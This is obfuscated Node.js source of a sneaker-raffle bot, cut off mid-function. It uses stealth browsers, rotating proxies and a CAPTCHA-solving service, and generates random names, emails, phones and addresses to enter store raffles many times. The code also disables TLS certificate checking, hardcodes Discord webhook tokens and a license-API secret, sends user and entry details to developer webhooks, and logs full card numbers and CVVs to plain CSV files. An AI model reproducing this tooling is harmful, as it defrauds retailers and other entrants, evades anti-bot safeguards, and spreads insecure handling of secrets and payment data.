process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x2021ac = require('node-imap'), _0xc8d62e = require('util')['inspect'];
const _0x22cc54 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x30886a } = require('discord.js');
var _0x3b7642 = require('exe');
const { execFile: _0xc1e9c5 } = require('child_process'), _0x5e99b4 = require('puppeteer-extra'), _0x231db9 = require('puppeteer-extra-plugin-recaptcha'), _0x352eb4 = require('puppeteer-extra-plugin-stealth'), _0x580fd6 = require('chalk'), _0x40199d = require('node-bash-title'), _0x442555 = require('fs'), _0x5f3bae = require('axios'), _0x3ad1a3 = require('papaparse');
var _0x17b33e = require('random-name');
const _0x15bdb0 = require('request');
var _0x27f157 = require('prompt');
const _0x3aae82 = _0x15bdb0['jar']();
var _0xb4964b = {};
const _0x4477da = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x420c27 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x42fb72 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x29f17a = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x582813 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x2612b4 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x1df251 = 'https://discord.com/api/webhooks/', _0x132772 = '' + _0x1df251 + _0x42fb72, _0x214943 = '' + _0x1df251 + _0x29f17a, _0xe17ea3 = '' + _0x1df251 + _0x4477da, _0x437fba = '' + _0x1df251 + _0x420c27, _0x3501b6 = '' + _0x1df251 + _0x582813, _0x567e0b = '' + _0x1df251 + _0x2612b4;
const _0x23d9ca = JSON['parse'](_0x442555['readFileSync']('../package.json', 'utf-8')), _0x3b25e6 = _0x23d9ca['version'];
var _0xbb8708, _0x5c29ec, _0x3121b3, _0x29314f, _0x39d549, _0x1dcebe, _0x1a887b, _0xfe2415;
const _0x5a2675 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x4bcc31 = ![];
const _0x72a93a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x4985a0 = '0123456789';
var _0x1843ef = _0x72a93a['split']('');
const _0x165982 = require('auto-git-update'), { PageEmittedEvents: _0x332cf0 } = require('puppeteer'), { getRandomValues: _0x51d68c } = require('crypto'), { resolve: _0x38cf8a } = require('path'), { Console: _0x1d482f } = require('console'), _0x313ff5 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0xe3d259 = new _0x165982(_0x313ff5);
async function _0x518dd0() {
    _0x39d549 = _0x442555['readdirSync']('../proxies'), _0x29314f = _0x442555['readdirSync']('../tasks'), !_0x442555['existsSync']('../accounts/fenom.csv') && _0x442555['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x442555['existsSync']('../accounts/bstn.csv') && _0x442555['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x442555['existsSync']('../failed-tasks.csv') && _0x442555['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x442555['existsSync']('../successful-tasks.csv') && _0x442555['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0xb4964b = JSON['parse'](_0x442555['readFileSync']('../settings.json', 'utf-8')), !_0xb4964b['delay'] && (_0xb4964b['delay'] = 0x3c, _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), !_0xb4964b['masterMail'] && (_0xb4964b['masterMail'] = 'yourmail@gmail.com', _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), !_0xb4964b['masterPassword'] && (_0xb4964b['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), !_0xb4964b['captchaKey'] && (_0xb4964b['captchaKey'] = '', _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), !_0xb4964b['useRandomProxy'] && (_0xb4964b['useRandomProxy'] = !![], _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), !_0xb4964b['shuffleTasks'] && (_0xb4964b['useRandomProxy'] = ![], _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), !_0xb4964b['webhook'] && (_0xb4964b['webhook'] = '', _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), _0xb4964b['delay'] <= 0x1388 && (_0xb4964b['delay'] = _0xb4964b['delay'] * 0x3e8), _0xb4964b['AfewDelay'] && (delete _0xb4964b['AfewDelay'], _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), _0xb4964b['MahaDelay'] && (delete _0xb4964b['MahaDelay'], _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), _0xb4964b['footshopDelay'] && (delete _0xb4964b['footshopDelay'], _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b, null, 0x2))), _0xb4964b['MahaDelay'] = _0xb4964b['delay'], _0x1df251 = _0xb4964b['webhook'], _0x1dcebe = _0xb4964b['licenseKey'];
}
let _0x58ccdc, _0x232188 = [], _0x4e8292;
const _0x63444f = _0x3ec219 => new Promise(_0x2855fd => setTimeout(_0x2855fd, _0x3ec219));
function _0x387c48(_0x19f862, _0x589944) {
    return Math['floor'](Math['random']() * (_0x589944 - _0x19f862 + 0x1) + _0x19f862);
}
function _0x27219f(_0x434c19) {
    let _0x167bf7 = _0x434c19['length'], _0x1063b0;
    while (_0x167bf7 != 0x0) {
        _0x1063b0 = Math['floor'](Math['random']() * _0x167bf7), _0x167bf7--, [_0x434c19[_0x167bf7], _0x434c19[_0x1063b0]] = [
            _0x434c19[_0x1063b0],
            _0x434c19[_0x167bf7]
        ];
    }
    return _0x434c19;
}
async function _0x169014(_0x44d1fa) {
    return _0x5f3bae['get']('https://api.hyper.co/v4/licenses/' + _0x44d1fa, { 'headers': { 'Authorization': 'Bearer\x20' + _0x5a2675 } })['then'](_0x2e513b => _0x2e513b['data'])['catch'](() => null);
}
;
async function _0x7a2cb4(_0xefe6e0) {
    console['clear']();
    if (_0xefe6e0 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x8693a6 = await _0x27f157['get']('License');
        if (_0x8693a6['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x63444f(0xbb8), _0x7a2cb4(_0xefe6e0);
        _0xefe6e0 = _0x8693a6['License'], _0xb4964b['licenseKey'] = _0xefe6e0, _0x1dcebe = _0xefe6e0, _0x442555['writeFileSync']('../settings.json', JSON['stringify'](_0xb4964b));
    }
    console['log']('Checking\x20license\x20' + _0x1dcebe + '...'), await _0x63444f(0x320);
    const _0x4d6377 = await _0x169014(_0xefe6e0);
    _0x1a887b = JSON['stringify'](_0x4d6377['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0xfe2415 = JSON['stringify'](_0x4d6377['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x4d6377)
        return console['log']('License\x20not\x20found');
    if (!_0x4d6377['user'])
        return console['log']('License\x20not\x20bound');
    return _0x4d6377['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x4bcc31 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x4bcc31 = ![]);
}
async function _0x1c4171() {
    var _0x3d6484 = await _0x27f157['get']('Module');
    return console['clear'](), _0x3d6484['Module'];
}
;
async function _0x5aaaf4() {
    var _0x35ccaa = await _0x27f157['get']('Setting');
    return console['clear'](), _0x35ccaa['Setting'];
}
async function _0x41736d() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x5dd212 = 0x0; _0x5dd212 < _0x29314f['length']; _0x5dd212++) {
        console['log']('\x20(' + _0x5dd212 + ')\x20' + _0x29314f[_0x5dd212]);
    }
    console['log']('');
    var _0x2e7357 = await _0x27f157['get']('Task');
    if (_0x2e7357['Task'] > _0x29314f['length'] - 0x1 || isNaN(_0x2e7357['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x63444f(0x3e8), _0x41736d();
    var _0x485b8f = _0x442555['readFileSync']('../tasks/' + _0x29314f[_0x2e7357['Task']], 'utf-8');
    return _0x3121b3 = _0x3ad1a3['parse'](_0x485b8f, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x580fd6['blue'](_0x29314f[_0x2e7357['Task']])), _0xbb8708 = _0x29314f[_0x2e7357['Task']], _0x3121b3;
}
async function _0x1317d8() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x226c7b = 0x0; _0x226c7b < _0x39d549['length']; _0x226c7b++) {
        console['log']('\x20(' + _0x226c7b + ')\x20' + _0x39d549[_0x226c7b]);
    }
    console['log']('');
    var _0x59d7fb = await _0x27f157['get']('Proxies');
    if (_0x59d7fb['Proxies'] > _0x39d549['length'] - 0x1 || isNaN(_0x59d7fb['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x63444f(0x3e8), _0x1317d8();
    var _0x152f67 = _0x442555['readFileSync']('../proxies/' + _0x39d549[_0x59d7fb['Proxies']], 'utf-8')['split']('\x0a');
    let _0x58ceca = _0x152f67['map']((_0x1cd456, _0x6e80b5) => {
        sanatizeProxy = _0x1cd456['replace']('\x0d', '');
        if (_0x152f67[_0x6e80b5 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x5c29ec = _0x39d549[_0x59d7fb['Proxies']], console['clear'](), _0x58ceca;
}
async function _0x142065() {
    var _0x523668 = await _0x27f157['get']('Value');
    return console['clear'](), _0x523668['Value'];
}
async function _0x1d67e4(_0x238da8) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x214d31 = 0x0; _0x214d31 < _0x238da8['length']; _0x214d31++) {
        console['log']('\x20(' + _0x214d31 + ')\x20[' + _0x238da8[_0x214d31]['name'] + ']');
    }
    ;
    console['log']('');
    var _0xe7179b = await _0x27f157['get']('Module');
    return _0xe7179b['Module'];
}
async function _0x1b3cf3() {
    var _0x142674 = await _0x27f157['get']('Password');
    return console['clear'](), _0x142674['Password'];
}
;
async function _0x41b807() {
    var _0x52fe52 = await _0x27f157['get']('Links');
    return _0x52fe52['Links'];
}
;
async function _0x2b6fdb() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x7e744b = 0x0; _0x7e744b < _0x232188['length']; _0x7e744b++) {
        console['log']('\x20(' + _0x7e744b + ')\x20' + _0x232188[_0x7e744b]);
    }
    ;
    console['log']();
    let _0x5e34da = await _0x27f157['get']('Product');
    return console['clear'](), _0x5e34da['Product'];
}
;
function _0x46d913() {
    var _0x11d1db = new Date(Date['now']())['toLocaleTimeString']();
    return _0x11d1db;
}
;
function _0x4a009a() {
    var _0x3603db = new Date(Date['now']())['toLocaleString']();
    return _0x3603db['replace'](',', '');
}
async function _0x584f8b(_0x5d0d96, _0x19d339) {
    let _0x185160 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x3b25e6 != 'devkey') {
        await _0x5f3bae['post'](_0x5d0d96, _0x19d339, _0x185160);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x4d9326(_0x24f273, _0x35245c, _0x542cdc, _0x4f6f71, _0x595289) {
    if (!_0x4f6f71 && _0x542cdc == 'dev') {
        var _0x406608 = new _0x30886a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x35245c['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x35245c['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x24f273['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0xb4964b['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x1a887b,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x24f273['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x24f273['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x3b25e6,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x406608['data'];
    } else {
        if (_0x4f6f71 && _0x542cdc == 'dev') {
            var _0x406608 = new _0x30886a()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x35245c['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x1a887b,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x35245c['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x24f273['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0xb4964b['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x595289,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x24f273['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x24f273['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x3b25e6,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x406608['data'];
        } else {
            if (_0x542cdc == 'pub') {
                var _0x406608 = new _0x30886a()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x35245c['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x35245c['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x24f273['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0xb4964b['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x24f273['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x3b25e6,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x406608['data'];
            } else {
                if (_0x542cdc == 'acc' && !_0x4f6f71) {
                    var _0x406608 = new _0x30886a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x35245c['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x1a887b,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x35245c['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0xb4964b['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x3b25e6,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x406608['data'];
                } else {
                    if (_0x542cdc == 'acc' && _0x4f6f71) {
                        var _0x406608 = new _0x30886a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x35245c['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x1a887b,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x595289,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x35245c['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0xb4964b['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x3b25e6,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x406608['data'];
                    } else {
                        if (_0x542cdc == 'open') {
                            var _0x406608 = new _0x30886a()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0xfe2415)['addFields']({
                                'name': 'User',
                                'value': '' + _0x1a887b,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x3b25e6,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x406608['data'];
                        } else {
                            if (!_0x4f6f71 && _0x542cdc == 'ver') {
                                var _0x406608 = new _0x30886a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x35245c['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x1a887b,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x35245c['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0xb4964b['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x3b25e6,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x406608['data'];
                            } else {
                                if (_0x4f6f71 && _0x542cdc == 'ver') {
                                    var _0x406608 = new _0x30886a()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x35245c['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x1a887b,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x595289,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x35245c['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0xb4964b['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x3b25e6,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x406608['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x1713f8(_0x72a77e, _0x1726d1) {
    var _0x1feaf6 = _0x72a77e[_0x1726d1]['Address1']['split'](''), _0x3da973 = _0x72a77e[_0x1726d1]['Address2']['split'](''), _0xb22998 = _0x72a77e[_0x1726d1]['Email']['split']('@');
    for (var _0x2fb18a = 0x0; _0x2fb18a < _0x1feaf6['length']; _0x2fb18a++) {
        if (_0x1feaf6[_0x2fb18a] == 'X') {
            var _0x23ff32 = Math['round'](Math['random']() * (_0x72a93a['length'] - 0x1));
            _0x1feaf6[_0x2fb18a] = _0x1843ef[_0x23ff32];
        }
    }
    ;
    for (var _0x2fb18a = 0x0; _0x2fb18a < _0x3da973['length']; _0x2fb18a++) {
        if (_0x3da973[_0x2fb18a] == 'X') {
            var _0x23ff32 = Math['round'](Math['random']() * (_0x72a93a['length'] - 0x1));
            _0x3da973[_0x2fb18a] = _0x1843ef[_0x23ff32];
        }
    }
    ;
    _0x72a77e[_0x1726d1]['FirstName'] == 'RANDOM' && (_0x72a77e[_0x1726d1]['FirstName'] = _0x17b33e['first']());
    _0x72a77e[_0x1726d1]['LastName'] == 'RANDOM' && (_0x72a77e[_0x1726d1]['LastName'] = _0x17b33e['last']());
    _0xb22998[0x0] == 'RANDOM' ? _0xb22998[0x0] = '' + _0x17b33e['first']() + _0x17b33e['last']() + _0x387c48(0x1, 0x270f) + '@' : _0xb22998[0x0] = _0xb22998[0x0] + '@';
    _0x72a77e[_0x1726d1]['Email'] = _0xb22998['join'](''), _0x72a77e[_0x1726d1]['Address1'] = _0x1feaf6['join'](''), _0x72a77e[_0x1726d1]['Address2'] = _0x3da973['join']('');
    _0x72a77e[_0x1726d1]['Phone'] == 'RANDOM' && (_0x72a77e[_0x1726d1]['Phone'] = '0' + _0x387c48(0x5f5e100, 0x3b9ac9ff));
    if (_0x72a77e[_0x1726d1]['Follower'] == 'RANDOM') {
        var _0x1f4dac = _0x387c48(0x1, 0x270f);
        _0x72a77e[_0x1726d1]['Follower'] = '' + _0x17b33e['first']() + _0x17b33e['last']() + _0x1f4dac + '\x20';
    }
    _0x72a77e[_0x1726d1]['HouseNumber'] == 'RANDOM' && (_0x72a77e[_0x1726d1]['HouseNumber'] = _0x387c48(0x1, 0xc8));
    if (_0x72a77e[_0x1726d1]['Address1'] == 'RANDOM') {
        var _0x52decc = Math['round'](Math['random']() * (_0x72a93a['length'] - 0x1)), _0x59f08d = _0x1843ef[_0x52decc];
        _0x72a77e[_0x1726d1]['Address1'] = _0x17b33e['last']() + 'straat', _0x72a77e[_0x1726d1]['Zip'] == '' && (_0x72a77e[_0x1726d1]['Postcode'] = _0x387c48(0x3e8, 0x270f) + '\x20' + _0x59f08d + _0x59f08d, _0x72a77e[_0x1726d1]['Zip'] = _0x72a77e[_0x1726d1]['Postcode']), _0x72a77e[_0x1726d1]['HouseNumber'] = '' + _0x387c48(0x1, 0xc8);
    }
    return;
}
;
async function _0x1d0bc0(_0x703511, _0x328601) {
    _0x442555['appendFileSync']('../failed-tasks.csv', _0x4a009a() + ',' + _0x328601['store'] + ',' + _0x328601['name'] + ',' + _0x703511['Url'] + ',' + _0x703511['Size'] + ',' + _0x703511['Follower'] + ',' + _0x703511['FirstName'] + ',' + _0x703511['LastName'] + ',' + _0x703511['Address1'] + ',' + _0x703511['Address2'] + ',' + _0x703511['HouseNumber'] + ',' + _0x703511['Zip'] + ',' + _0x703511['City'] + ',' + _0x703511['State'] + ',' + _0x703511['Country'] + ',' + _0x703511['Phone'] + ',' + _0x703511['Email'] + ',' + _0x703511['Password'] + ',' + _0x703511['PaymentMethod'] + ',' + _0x703511['CardType'] + ',' + _0x703511['NameOnCard'] + ',' + _0x703511['CardNumber'] + ',' + _0x703511['ExpiryDate'] + ',' + _0x703511['CVV'] + ',' + _0x703511['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0xa2d2c6(_0xa56a98, _0x11a738) {
    _0x442555['appendFileSync']('../successful-tasks.csv', _0x4a009a() + ',' + _0x11a738['store'] + ',' + _0x11a738['name'] + ',' + _0xa56a98['Url'] + ',' + _0xa56a98['Size'] + ',' + _0xa56a98['Follower'] + ',' + _0xa56a98['FirstName'] + ',' + _0xa56a98['LastName'] + ',' + _0xa56a98['Address1'] + ',' + _0xa56a98['Address2'] + ',' + _0xa56a98['HouseNumber'] + ',' + _0xa56a98['Zip'] + ',' + _0xa56a98['City'] + ',' + _0xa56a98['State'] + ',' + _0xa56a98['Country'] + ',' + _0xa56a98['Phone'] + ',' + _0xa56a98['Email'] + ',' + _0xa56a98['Password'] + ',' + _0xa56a98['PaymentMethod'] + ',' + _0xa56a98['CardType'] + ',' + _0xa56a98['NameOnCard'] + ',' + _0xa56a98['CardNumber'] + ',' + _0xa56a98['ExpiryDate'] + ',' + _0xa56a98['CVV'] + ',' + _0xa56a98['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0xc31d70() {
    let _0x52c92f = proxyFile['split']('\x0a'), _0x4de19b = _0x52c92f['map']((_0x3c3e37, _0x3ec6fd) => {
        sanatizeProxy = _0x3c3e37['replace']('\x0d', '');
        if (_0x52c92f[_0x3ec6fd + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4de19b;
}
;
async function _0x4c2cdd(_0x3170cc) {
    var _0x39fe38 = _0x3170cc[0x1]['split'](':');
    const _0x1c7e10 = await _0x5e99b4['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x39fe38[0x0] + ':' + _0x39fe38[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x193640 = await _0x1c7e10['newPage']();
        await _0x193640['authenticate']({
            'username': '' + _0x39fe38[0x2],
            'password': '' + _0x39fe38[0x3]
        }), console['log'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x193640['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x193640['setRequestInterception'](!![]), _0x193640['on']('request', _0x5d661b => {
            _0x5d661b['resourceType']() === 'image' || _0x5d661b['resourceType']() === 'font' || _0x5d661b['resourceType']() === 'media' ? _0x5d661b['abort']() : _0x5d661b['continue']();
        }), await _0x193640['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x193640['waitForTimeout'](0xbb8), await _0x193640['waitForSelector']('.product-card');
        const _0x483774 = await _0x193640['$$eval']('a.product-card', _0x177f35 => {
            return _0x177f35['map'](_0x6cd0a0 => _0x6cd0a0['href']);
        });
        return _0x232188 = _0x483774;
    } catch (_0x51e050) {
        console['log']('\x20' + _0x51e050);
    } finally {
        _0x1c7e10['close'](), console['clear']();
    }
}
;
async function _0x186e20(_0x433486, _0x4bfc92) {
    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xb4964b['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3af7c0 = 0x0; _0x3af7c0 < bouncewear['length']; _0x3af7c0++) {
        await _0x1713f8(bouncewear, _0x3af7c0);
        if (bouncewear[_0x3af7c0]['Email'] == '' || bouncewear[_0x3af7c0]['Password'] == '' || bouncewear[_0x3af7c0]['FirstName'] == '' || bouncewear[_0x3af7c0]['LastName'] == '') {
            console['log'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xb4964b['useRandomProxy'] = ![])
            var _0x18df00 = _0xc31d70()[_0x3af7c0]['split'](':');
        else
            var _0x136cbb = Math['round'](Math['random']() * (_0xc31d70()['length'] - 0x1)), _0x18df00 = _0xc31d70()[_0x136cbb]['split'](':');
        const _0x1c16b2 = await _0x5e99b4['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x18df00[0x0] + ':' + _0x18df00[0x1],
